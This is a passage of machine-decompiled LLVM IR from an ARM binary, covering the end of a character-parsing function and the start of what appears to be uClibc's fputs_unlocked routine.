  %v3_1586c = load i8, i8* %v2_1586c, align 1
  %v4_1586c = zext i8 %v3_1586c to i32
  store i32 %v4_1586c, i32* %r3.global-to-local, align 4
  store i32 %v1_1586c, i32* %r0.global-to-local, align 4
  %v8_15874 = icmp sgt i32 %v0_15870.pre, %v4_1586c
  br i1 %v8_15874, label %dec_label_pc_1586c, label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_1586c
  %v2_15880.neg = sub i32 38880, %v0_15864
  %v2_15884 = add i32 %v2_15880.neg, %v1_1586c
  %v2_15888 = mul i32 %v2_15884, 2
  store i32 %v2_15888, i32* %r2.global-to-local, align 4
  %v2_1588c = add i32 %v0_15864, -38896
  store i32 %v2_1588c, i32* %r3.global-to-local, align 4
  %v2_15890 = add i32 %v2_15888, %v2_1588c
  %v3_15890 = inttoptr i32 %v2_15890 to i16*
  %v4_15890 = load i16, i16* %v3_15890, align 2
  %v6_15890 = sext i16 %v4_15890 to i32
  store i32 %v6_15890, i32* %r1.global-to-local, align 4
  %v2_15898 = add i32 %v0_15864, -38912
  store i32 %v2_15898, i32* %r3.global-to-local, align 4
  %v2_1589c = add i32 %v2_15888, %v2_15898
  %v3_1589c = inttoptr i32 %v2_1589c to i16*
  %v4_1589c = load i16, i16* %v3_1589c, align 2
  %v6_1589c = sext i16 %v4_1589c to i32
  %v1_158a0 = load i32, i32* @ip, align 4
  %v2_158a0 = or i32 %v1_158a0, %v6_15890
  %v2_158a4 = and i32 %v2_158a0, %v6_1589c
  store i32 %v2_158a4, i32* %r1.global-to-local, align 4
  store i32 -38832, i32* %r3.global-to-local, align 4
  %v2_158ac = add i32 %v0_15864, -38832
  store i32 %v2_158ac, i32* %r0.global-to-local, align 4
  store i32 %v2_158a4, i32* %stack_var_-72, align 4
  %v0_158d0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_158c4

dec_label_pc_158b8:                               ; preds = %dec_label_pc_15834
  %v1_158b8 = add i32 %v1_15848, 1
  %v2_158b8 = inttoptr i32 %v1_158b8 to i8*
  %v3_158b8 = load i8, i8* %v2_158b8, align 1
  %v4_158b8 = zext i8 %v3_158b8 to i32
  store i32 %v4_158b8, i32* %r3.global-to-local, align 4
  store i32 %v1_158b8, i32* %r0.global-to-local, align 4
  %v2_158bc = icmp eq i8 %v3_158b8, 0
  br i1 %v2_158bc, label %dec_label_pc_158c4, label %dec_label_pc_15834

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b8, %dec_label_pc_15878
  %v0_158d0 = phi i32 [ %v0_158d0.pre, %dec_label_pc_15878 ], [ %v0_15818, %dec_label_pc_158b8 ]
  %v0_158cc = phi i32 [ %v1_158a0, %dec_label_pc_15878 ], [ %v3_15824, %dec_label_pc_158b8 ]
  %v0_158c4 = load i32, i32* @r4, align 4
  %v1_158c4 = and i32 %v0_158c4, 4
  %v1_158c8 = and i32 %v0_158c4, -5
  store i32 %v1_158c8, i32* %r3.global-to-local, align 4
  %v1_158cc = and i32 %v0_158cc, 3840
  store i32 %v1_158cc, i32* %r2.global-to-local, align 4
  %v1_158d0 = inttoptr i32 %v0_158d0 to i8*
  %v2_158d0 = load i8, i8* %v1_158d0, align 1
  %v3_158d0 = zext i8 %v2_158d0 to i32
  store i32 %v3_158d0, i32* %r1.global-to-local, align 4
  %v2_158d4 = or i32 %v1_158c8, %v1_158cc
  store i32 %v2_158d4, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_158c4, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_158e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_158e0 = add i32 %v1_158e0, 20
  %v3_158e0 = inttoptr i32 %v2_158e0 to i32*
  store i32 %tmp181, i32* %v3_158e0, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_158e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_158e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_158e8 = add i32 %v1_158e8, 12
  %v3_158e8 = inttoptr i32 %v2_158e8 to i32*
  store i32 %v0_158e8, i32* %v3_158e8, align 4
  %v0_158ec = load i32, i32* %r7.global-to-local, align 4
  %v1_158ec = add i32 %v0_158ec, 4
  %v2_158ec = inttoptr i32 %v1_158ec to i32*
  %v3_158ec = load i32, i32* @r5, align 4
  store i32 %v3_158ec, i32* %v2_158ec, align 4
  %v4_158ec = add i32 %v0_158ec, 8
  %v5_158ec = inttoptr i32 %v4_158ec to i32*
  %v6_158ec = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_158ec, i32* %v5_158ec, align 4
  %v0_158f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_158f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_158f0 = add i32 %v1_158f0, 16
  %v3_158f0 = inttoptr i32 %v2_158f0 to i32*
  store i32 %v0_158f0, i32* %v3_158f0, align 4
  %v0_158f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_158f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_158f4 = add i32 %v1_158f4, 28
  %v3_158f4 = inttoptr i32 %v2_158f4 to i32*
  store i32 %v0_158f4, i32* %v3_158f4, align 4
  %v0_158f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_158f8 = inttoptr i32 %v0_158f8 to i8*
  %v2_158f8 = load i8, i8* %v1_158f8, align 1
  %v3_158f8 = zext i8 %v2_158f8 to i32
  store i32 %v3_158f8, i32* %r2.global-to-local, align 4
  %v2_158fc = icmp eq i8 %v2_158f8, 0
  br i1 %v2_158fc, label %dec_label_pc_15904, label %dec_label_pc_15988

dec_label_pc_15904:                               ; preds = %dec_label_pc_158c4
  %v0_15904 = load i32, i32* %r6.global-to-local, align 4
  %v1_15904 = inttoptr i32 %v0_15904 to i8*
  %v2_15904 = load i8, i8* %v1_15904, align 1
  %v3_15904 = zext i8 %v2_15904 to i32
  store i32 %v3_15904, i32* %r3.global-to-local, align 4
  %v7_15908 = icmp eq i8 %v2_15904, 109
  br i1 %v7_15908, label %.thread28, label %dec_label_pc_1591c

.thread28:                                        ; preds = %dec_label_pc_15904
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_15910 = load i32, i32* %r7.global-to-local, align 4
  %v3_15910 = add i32 %v2_15910, 32
  %v4_15910 = inttoptr i32 %v3_15910 to i32*
  store i32 20, i32* %v4_15910, align 4
  %v1_15914 = load i32, i32* %r2.global-to-local, align 4
  %v2_15914 = load i32, i32* %r7.global-to-local, align 4
  %v3_15914 = add i32 %v2_15914, 28
  %v4_15914 = inttoptr i32 %v3_15914 to i32*
  store i32 %v1_15914, i32* %v4_15914, align 4
  br label %dec_label_pc_15988

dec_label_pc_1591c:                               ; preds = %dec_label_pc_15904
  store i32 880, i32* %r3.global-to-local, align 4
  %v0_15920 = load i32, i32* @lr, align 4
  %v2_15920 = add i32 %v0_15920, 880
  %v3_15920 = inttoptr i32 %v2_15920 to i32*
  %v4_15920 = load i32, i32* %v3_15920, align 4
  store i32 %v4_15920, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_15928 = load i32, i32* %r7.global-to-local, align 4
  %v2_15928 = add i32 %v1_15928, 32
  %v3_15928 = inttoptr i32 %v2_15928 to i32*
  store i32 21, i32* %v3_15928, align 4
  %v0_1592c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1592c, i32* @ip, align 4
  %v1_15930 = add i32 %v0_1592c, 10
  store i32 %v1_15930, i32* %r0.global-to-local, align 4
  %v0_15938.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_15938 = inttoptr i32 %v0_15938.pre to i8*
  br label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_15978, %dec_label_pc_1591c
  %v1_15944 = phi i32 [ %v1_15978, %dec_label_pc_15978 ], [ %v0_1592c, %dec_label_pc_1591c ]
  %v1_15934 = inttoptr i32 %v1_15944 to i8*
  %v2_15934 = load i8, i8* %v1_15934, align 1
  %v3_15934 = zext i8 %v2_15934 to i32
  store i32 %v3_15934, i32* %r2.global-to-local, align 4
  %v2_15938 = load i8, i8* %v1_15938, align 1
  %v3_15938 = zext i8 %v2_15938 to i32
  store i32 %v3_15938, i32* %r3.global-to-local, align 4
  %v9_1593c = icmp eq i8 %v2_15934, %v2_15938
  br i1 %v9_1593c, label %dec_label_pc_15944, label %dec_label_pc_15978

dec_label_pc_15944:                               ; preds = %dec_label_pc_15934
  %v2_15944 = sub i32 %v1_15944, %v0_1592c
  store i32 %v2_15944, i32* %r3.global-to-local, align 4
  %v0_1594c = load i32, i32* %r7.global-to-local, align 4
  %v1_1594c = add i32 %v0_1594c, 4
  store i32 %v1_1594c, i32* %r0.global-to-local, align 4
  %v0_15950 = load i32, i32* @lr, align 4
  %v2_15950 = add i32 %v0_15950, 29140
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_15958 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15958, i32* %r2.global-to-local, align 4
  %v4_1595c = mul i32 %v2_15944, 4
  %v5_1595c = add i32 %v2_15950, %v4_1595c
  %v6_1595c = inttoptr i32 %v5_1595c to i32*
  %v7_1595c = load i32, i32* %v6_1595c, align 4
  store i32 %v7_1595c, i32* @ip, align 4
  store i32 88424, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_1595c)
  %v0_15968 = load i32, i32* %r0.global-to-local, align 4
  %v1_1596c = load i32, i32* %r7.global-to-local, align 4
  %v2_1596c = add i32 %v1_1596c, 28
  %v3_1596c = inttoptr i32 %v2_1596c to i32*
  store i32 %v0_15968, i32* %v3_1596c, align 4
  %v7_15970 = icmp sgt i32 %v0_15968, 5
  br i1 %v7_15970, label %dec_label_pc_15a84, label %dec_label_pc_15988

dec_label_pc_15978:                               ; preds = %dec_label_pc_15934
  %v1_15978 = add i32 %v1_15944, 1
  store i32 %v1_15978, i32* %r1.global-to-local, align 4
  %v3_1597c = icmp ult i32 %v1_15978, %v1_15930
  br i1 %v3_1597c, label %dec_label_pc_15934, label %dec_label_pc_15a84

dec_label_pc_15988:                               ; preds = %.thread28, %dec_label_pc_15944, %dec_label_pc_158c4
  %v0_15988 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_15988, 1
  br i1 %tmp156, label %dec_label_pc_15a34, label %dec_label_pc_15990

dec_label_pc_15990:                               ; preds = %dec_label_pc_15988
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_159a8 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_15a1c, %dec_label_pc_15990
  %v9_159b4 = phi i32 [ 0, %dec_label_pc_15990 ], [ %v1_15a20, %dec_label_pc_15a1c ]
  %v7_15998 = icmp sgt i32 %v9_159b4, 2
  br i1 %v7_15998, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_15994
  store i32 %v9_159a8, i32* %r3.global-to-local, align 4
  %v10_159b4 = add i32 %v9_159b4, %v9_159a8
  store i32 %v10_159b4, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_15994
  store i32 %v3_15610.pre-phi, i32* @ip, align 4
  %v12_1599c = mul i32 %v9_159b4, 4
  %v13_1599c = add i32 %v12_1599c, %v3_15610.pre-phi
  store i32 %v13_1599c, i32* %r3.global-to-local, align 4
  %v9_159a4 = add i32 %v13_1599c, -12
  %v10_159a4 = inttoptr i32 %v9_159a4 to i8*
  %v11_159a4 = load i8, i8* %v10_159a4, align 4
  %v12_159a4 = zext i8 %v11_159a4 to i32
  store i32 %v12_159a4, i32* %r2.global-to-local, align 4
  %v9_159ac = load i32, i32* %r7.global-to-local, align 4
  %v10_159ac = add i32 %v9_159ac, %v9_159b4
  store i32 %v10_159ac, i32* %r3.global-to-local, align 4
  store i32 %v12_159a4, i32* %r1.global-to-local, align 4
  %v11_159b8 = add i32 %v10_159ac, 36
  %v12_159b8 = inttoptr i32 %v11_159b8 to i8*
  store i8 %v11_159a4, i8* %v12_159b8, align 1
  %v0_159bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_159dc = phi i32 [ %v10_159b4, %.thread38 ], [ %v0_159bc.pre, %bb157 ]
  %v1_159bc = load i32, i32* %fp.global-to-local, align 4
  %v2_159bc = sub i32 %v0_159dc, %v1_159bc
  %v4_159bc = xor i32 %v1_159bc, %v0_159dc
  %v5_159bc = xor i32 %v2_159bc, %v0_159dc
  %v6_159bc = and i32 %v5_159bc, %v4_159bc
  %v7_159bc = icmp slt i32 %v6_159bc, 0
  %v8_159bc = icmp slt i32 %v2_159bc, 0
  %v9_159bc = icmp eq i32 %v0_159dc, %v1_159bc
  %v3_159c0 = xor i1 %v8_159bc, %v7_159bc
  %v4_159c0 = or i1 %v9_159bc, %v3_159c0
  br i1 %v4_159c0, label %dec_label_pc_159d0, label %dec_label_pc_159c4

dec_label_pc_159c4:                               ; preds = %bb158
  %v1_159c4 = add i32 %v0_159dc, -9
  %v3_159c4 = sub i32 8, %v0_159dc
  %v4_159c4 = and i32 %v3_159c4, %v0_159dc
  %v5_159c4 = icmp slt i32 %v4_159c4, 0
  %v6_159c4 = icmp slt i32 %v1_159c4, 0
  %v7_159c4 = icmp eq i32 %v0_159dc, 9
  %v3_159c8 = xor i1 %v6_159c4, %v5_159c4
  %v4_159c8 = or i1 %v7_159c4, %v3_159c8
  br i1 %v4_159c8, label %dec_label_pc_159cc, label %dec_label_pc_15a84

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159c4
  store i32 %v0_159dc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_159d0

dec_label_pc_159d0:                               ; preds = %bb158, %dec_label_pc_159cc
  store i32 %v3_15610.pre-phi, i32* @r2, align 4
  %v1_159d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_159d4 = mul i32 %v1_159d4, 4
  %v5_159d4 = add i32 %v4_159d4, %v3_15610.pre-phi
  store i32 %v5_159d4, i32* %sb.global-to-local, align 4
  %v1_159d8 = add i32 %v5_159d4, -40
  %v2_159d8 = inttoptr i32 %v1_159d8 to i32*
  %v3_159d8 = load i32, i32* %v2_159d8, align 4
  store i32 %v3_159d8, i32* %r5.global-to-local, align 4
  %v1_159dc = add i32 %v0_159dc, -1
  store i32 %v1_159dc, i32* %r3.global-to-local, align 4
  %v0_159e0 = load i32, i32* %r7.global-to-local, align 4
  %v4_159e0 = mul i32 %v1_159dc, 4
  %v5_159e0 = add i32 %v0_159e0, %v4_159e0
  store i32 %v5_159e0, i32* %sl.global-to-local, align 4
  %v7_159e4 = icmp eq i32 %v3_159d8, 8
  %v1_159e8 = add i32 %v5_159e0, 40
  %v2_159e8 = inttoptr i32 %v1_159e8 to i32*
  %v3_159e8 = load i32, i32* %v2_159e8, align 4
  store i32 %v3_159e8, i32* @r0, align 4
  br i1 %v7_159e4, label %dec_label_pc_15a1c, label %dec_label_pc_159f0

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159d0
  %v9_159f0 = icmp eq i32 %v3_159e8, %v3_159d8
  br i1 %v9_159f0, label %dec_label_pc_15a14, label %bb159

bb159:                                            ; preds = %dec_label_pc_159f0
  %v8_159f4 = icmp eq i32 %v3_159e8, 8
  br i1 %v8_159f4, label %dec_label_pc_15a14, label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %bb159
  %v0_159fc = call i32 @_promoted_size()
  %v0_15a04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15a04, i32* @r0, align 4
  %v0_15a08 = call i32 @_promoted_size()
  store i32 %v0_15a08, i32* %r0.global-to-local, align 4
  %v8_15a10 = icmp sgt i32 %v0_159fc, %v0_15a08
  br i1 %v8_15a10, label %dec_label_pc_15a1c, label %dec_label_pc_159fc.dec_label_pc_15a14_crit_edge

dec_label_pc_159fc.dec_label_pc_15a14_crit_edge:  ; preds = %dec_label_pc_159fc
  %v0_15a14.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_15a18.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15a14

dec_label_pc_15a14:                               ; preds = %dec_label_pc_159fc.dec_label_pc_15a14_crit_edge, %dec_label_pc_159f0, %bb159
  %v1_15a18 = phi i32 [ %v1_15a18.pre, %dec_label_pc_159fc.dec_label_pc_15a14_crit_edge ], [ %v5_159e0, %dec_label_pc_159f0 ], [ %v5_159e0, %bb159 ]
  %v0_15a14 = phi i32 [ %v0_15a14.pre, %dec_label_pc_159fc.dec_label_pc_15a14_crit_edge ], [ %v5_159d4, %dec_label_pc_159f0 ], [ %v5_159d4, %bb159 ]
  %v1_15a14 = add i32 %v0_15a14, -40
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  store i32 %v3_15a14, i32* %r3.global-to-local, align 4
  %v2_15a18 = add i32 %v1_15a18, 40
  %v3_15a18 = inttoptr i32 %v2_15a18 to i32*
  store i32 %v3_15a14, i32* %v3_15a18, align 4
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_159fc, %dec_label_pc_159d0, %dec_label_pc_15a14
  %v0_15a1c = load i32, i32* %r7.global-to-local, align 4
  %v1_15a1c = add i32 %v0_15a1c, 28
  %v2_15a1c = inttoptr i32 %v1_15a1c to i32*
  %v3_15a1c = load i32, i32* %v2_15a1c, align 4
  %v0_15a20 = load i32, i32* %r8.global-to-local, align 4
  %v1_15a20 = add i32 %v0_15a20, 1
  store i32 %v1_15a20, i32* %r8.global-to-local, align 4
  %v1_15a24 = add i32 %v3_15a1c, 2
  store i32 %v1_15a24, i32* %r3.global-to-local, align 4
  %v6_15a2c = icmp slt i32 %v1_15a20, %v1_15a24
  br i1 %v6_15a2c, label %dec_label_pc_15994, label %dec_label_pc_15a50

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15988
  %v0_15a34 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a34 = add i32 %v0_15a34, 28
  %v2_15a34 = inttoptr i32 %v1_15a34 to i32*
  %v3_15a34 = load i32, i32* %v2_15a34, align 4
  store i32 %v3_15a34, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_15a3c = add i32 %v0_15a34, 38
  %v4_15a3c = inttoptr i32 %v3_15a3c to i8*
  store i8 1, i8* %v4_15a3c, align 1
  %v0_15a40 = load i32, i32* %r2.global-to-local, align 4
  %v3_15a40 = mul i32 %v0_15a40, 4
  store i32 %v3_15a40, i32* @r2, align 4
  %v0_15a44 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a44 = add i32 %v0_15a44, 40
  store i32 %v1_15a44, i32* @r0, align 4
  %v2_15a48 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15a48, i32* @r1, align 4
  %v0_15a4c = call i32 @memcpy()
  store i32 %v0_15a4c, i32* %r0.global-to-local, align 4
  %v0_15a50.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15a50

dec_label_pc_15a50:                               ; preds = %dec_label_pc_15a1c, %dec_label_pc_15a34
  %v2_15a6c = phi i32 [ %v0_15a50.pre, %dec_label_pc_15a34 ], [ %v0_15a1c, %dec_label_pc_15a1c ]
  %v1_15a50 = add i32 %v2_15a6c, 16
  %v2_15a50 = inttoptr i32 %v1_15a50 to i32*
  %v3_15a50 = load i32, i32* %v2_15a50, align 4
  store i32 %v3_15a50, i32* %r3.global-to-local, align 4
  %v1_15a54 = and i32 %v3_15a50, 128
  %v2_15a54 = icmp eq i32 %v1_15a54, 0
  br i1 %v2_15a54, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_15a50
  %v3_15a58 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_15a58, i32* %r3.global-to-local, align 4
  %v2_15a5c = inttoptr i32 %v2_15a6c to i32*
  %v3_15a5c = load i32, i32* %v2_15a5c, align 4
  %v2_15a64.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_15a64 = sub i32 %v2_15a64.pre, %v3_15a58
  store i32 %v3_15a64, i32* %r3.global-to-local, align 4
  %v5_15a68 = mul i32 %v3_15a64, 4
  %v6_15a68 = add i32 %v5_15a68, %v3_15a5c
  store i32 %v6_15a68, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_15a50
  %v1_15a6045 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a6046 = add i32 %v1_15a6045, 1
  store i32 %v2_15a6046, i32* %r3.global-to-local, align 4
  %v3_15a6c = inttoptr i32 %v2_15a6c to i32*
  store i32 %v2_15a6046, i32* %v3_15a6c, align 4
  %v0_15a70.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_15a78 = phi i32 [ %v2_15a6c, %.thread48 ], [ %v0_15a70.pre, %.thread50 ]
  %v1_15a70 = add i32 %v1_15a78, 28
  %v2_15a70 = inttoptr i32 %v1_15a70 to i32*
  %v3_15a70 = load i32, i32* %v2_15a70, align 4
  store i32 %v3_15a70, i32* %r3.global-to-local, align 4
  %v1_15a74 = add i32 %v3_15a70, 2
  store i32 %v1_15a74, i32* %r0.global-to-local, align 4
  %v0_15a78 = load i32, i32* %fp.global-to-local, align 4
  %v2_15a78 = add i32 %v1_15a78, 24
  %v3_15a78 = inttoptr i32 %v2_15a78 to i32*
  store i32 %v0_15a78, i32* %v3_15a78, align 4
  br i1 %v2_15a54, label %dec_label_pc_15a88, label %bb161

bb161:                                            ; preds = %bb160
  %v1_15a7c = load i32, i32* @r2, align 4
  %v2_15a7c = load i32, i32* %r7.global-to-local, align 4
  %v3_15a7c = inttoptr i32 %v2_15a7c to i32*
  store i32 %v1_15a7c, i32* %v3_15a7c, align 4
  br label %dec_label_pc_15a88

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15978, %dec_label_pc_15598, %dec_label_pc_156e0, %dec_label_pc_1578c, %dec_label_pc_15764, %dec_label_pc_15770, %dec_label_pc_156ac, %dec_label_pc_159c4, %dec_label_pc_15944, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a88

dec_label_pc_15a88:                               ; preds = %bb161, %bb160, %dec_label_pc_15a84
  %v2_15a8c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15a8c, i32* @r4, align 4
  store i32 %v6_15554, i32* @r5, align 4
  store i32 %v27_15554, i32* @lr, align 4
  %v1_15a90 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15a90

; uselistorder directives
  uselistorder i32 %v3_15a64, { 1, 0 }
  uselistorder i32 %v1_15a20, { 1, 2, 0 }
  uselistorder i32 %v2_159bc, { 1, 0 }
  uselistorder i32 %v1_159bc, { 1, 0, 2 }
  uselistorder i32 %v0_159dc, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_159b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15978, { 1, 2, 0 }
  uselistorder i32 %v0_15968, { 1, 0 }
  uselistorder i32 %v1_15944, { 1, 0, 2 }
  uselistorder i32 %v1_158b8, { 1, 2, 0 }
  uselistorder i32 %v1_158a0, { 1, 0 }
  uselistorder i32 %v2_15888, { 2, 1, 0 }
  uselistorder i32 %v1_1586c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15864, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_15848, { 1, 0, 2 }
  uselistorder i32 %v2_15830, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15824, { 2, 1, 0 }
  uselistorder i32 %v1_157e4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_157d4.pre, { 0, 2, 1 }
  uselistorder i32 %v2_157b0, { 1, 0 }
  uselistorder i32 %v5_15710, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15710, { 1, 0 }
  uselistorder i32 %v0_1571476, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_156b8, { 1, 0 }
  uselistorder i32 %v0_156d8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_1569c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_15684, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_15674, { 1, 0 }
  uselistorder i32 %v3_1566c, { 0, 2, 1 }
  uselistorder i8 %v2_1566c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_156ec, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_15630, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1561c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15604, { 1, 0 }
  uselistorder i32 %v3_15610.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_155b8, { 0, 2, 1 }
  uselistorder i32 %v2_155a4, { 1, 0, 2 }
  uselistorder i32 %v0_15558, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 0, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 10, 11, 13, 9, 3, 4, 12, 5, 14, 6, 7, 8, 16, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 -38832, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_15a88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a84, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_15a50, { 1, 0 }
  uselistorder label %dec_label_pc_15a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a14, { 0, 2, 1 }
  uselistorder label %dec_label_pc_159d0, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_15988, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1579c, { 1, 0 }
  uselistorder label %dec_label_pc_15750, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_156cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156c8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_15668, { 1, 0 }
  uselistorder label %dec_label_pc_15664, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15668.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15608, { 1, 0 }
  uselistorder label %dec_label_pc_155dc, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15ac4 = load i32, i32* @r4, align 4
  store i32 %v3_15ac4, i32* %stack_var_-16, align 4
  %v6_15ac4 = load i32, i32* @r5, align 4
  %v9_15ac4 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_15ad0 = call i32 @strlen(i8* %arg1)
  store i32 %v3_15ad0, i32* @r6, align 4
  %v0_15ad8 = load i32, i32* @r5, align 4
  %v0_15adc = load i32, i32* @r4, align 4
  %v5_15ae8 = inttoptr i32 %v0_15ad8 to i16*
  %v6_15ae8 = call i32 @__GI_fwrite_unlocked(i32 %v0_15adc, i32 1, i32 %v3_15ad0, i16* %v5_15ae8)
  %v1_15aec = load i32, i32* @r6, align 4
  %v9_15aec = icmp eq i32 %v6_15ae8, %v1_15aec
  br i1 %v9_15aec, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_15af8 = phi i32 [ %v6_15ae8, %entry ], [ -1, %bb ]
  %v2_15af4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15af4, i32* @r4, align 4
  store i32 %v6_15ac4, i32* @r5, align 4
